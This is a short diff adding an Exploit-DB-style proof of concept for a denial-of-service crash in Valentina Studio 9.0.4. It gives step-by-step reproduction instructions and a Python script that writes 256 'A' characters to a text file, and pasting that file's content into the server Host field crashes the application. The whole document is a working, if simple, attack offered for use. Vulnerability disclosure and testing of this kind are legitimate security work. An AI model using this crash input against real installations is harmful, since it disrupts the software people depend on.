@@ -1,0 +1,22 @@
+#Exploit Title: Valentina Studio 9.0.4 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2018-02-19
+#Vendor Homepage: https://valentina-db.com/en/
+#Software Link: https://valentina-db.com/en/developer/database/download-valentina-database-adk
+#Tested Version: 9.0.4
+#Tested on: Windows 7 x64 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: Valentina_Studio_9.0.4.py
+#2.- Open valentina.txt and copy content to clipboard
+#3.- Open Valentina Studio
+#4.- Select "File" > "Connect to"
+#5.- Select "Valentina Server"
+#6.- Select "Host" and Paste Clipboard
+#7.- Crashed
+
+cod = "\x41" * 256
+
+f = open('valentina.txt', 'w')
+f.write(cod)
+f.close()
